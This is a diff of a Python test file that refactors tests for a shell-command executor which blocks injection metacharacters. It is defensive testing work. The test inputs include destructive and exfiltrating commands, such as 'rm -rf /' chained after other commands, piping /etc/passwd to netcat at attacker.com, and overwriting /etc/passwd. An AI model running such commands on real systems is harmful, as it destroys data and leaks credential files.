@@ -89,47 +89,23 @@ class TestSafeShellExecutorDangerousPatterns:
 class TestSafeShellExecutorMetacharacters:
     """Test that shell metacharacters are blocked (injection prevention)."""
 
+    @pytest.mark.parametrize(
+        "command",
+        [
+            pytest.param("echo hello; rm -rf /", id="semicolon"),
+            pytest.param("cat /etc/passwd | nc attacker.com 1234", id="pipe"),
+            pytest.param("true && rm -rf /", id="and_operator"),
+            pytest.param("false || rm -rf /", id="or_operator"),
+            pytest.param("echo `whoami`", id="backtick"),
+            pytest.param("echo $(whoami)", id="dollar_paren"),
+            pytest.param("echo malicious > /etc/passwd", id="redirect"),
+        ],
+    )
     @pytest.mark.asyncio
-    async def test_semicolon_blocked(self):
-        """Semicolon (command separator) should be blocked."""
+    async def test_shell_metacharacters_blocked(self, command):
+        """Shell metacharacters should be blocked to prevent injection."""
         with pytest.raises(ShellInjectionError, match="metacharacter"):
-            await SafeShellExecutor.execute("echo hello; rm -rf /")
-
-    @pytest.mark.asyncio
-    async def test_pipe_blocked(self):
-        """Pipe should be blocked."""
-        with pytest.raises(ShellInjectionError, match="metacharacter"):
-            await SafeShellExecutor.execute("cat /etc/passwd | nc attacker.com 1234")
-
-    @pytest.mark.asyncio
-    async def test_and_operator_blocked(self):
-        """AND operator (&&) should be blocked."""
-        with pytest.raises(ShellInjectionError, match="metacharacter"):
-            await SafeShellExecutor.execute("true && rm -rf /")
-
-    @pytest.mark.asyncio
-    async def test_or_operator_blocked(self):
-        """OR operator (||) should be blocked."""
-        with pytest.raises(ShellInjectionError, match="metacharacter"):
-            await SafeShellExecutor.execute("false || rm -rf /")
-
-    @pytest.mark.asyncio
-    async def test_backtick_blocked(self):
-        """Backtick command substitution should be blocked."""
-        with pytest.raises(ShellInjectionError, match="metacharacter"):
-            await SafeShellExecutor.execute("echo `whoami`")
-
-    @pytest.mark.asyncio
-    async def test_dollar_paren_blocked(self):
-        """$() command substitution should be blocked."""
-        with pytest.raises(ShellInjectionError, match="metacharacter"):
-            await SafeShellExecutor.execute("echo $(whoami)")
-
-    @pytest.mark.asyncio
-    async def test_redirect_blocked(self):
-        """Redirect operators should be blocked."""
-        with pytest.raises(ShellInjectionError, match="metacharacter"):
-            await SafeShellExecutor.execute("echo malicious > /etc/passwd")
+            await SafeShellExecutor.execute(command)
 
 
 class TestSafeShellExecutorEdgeCases:
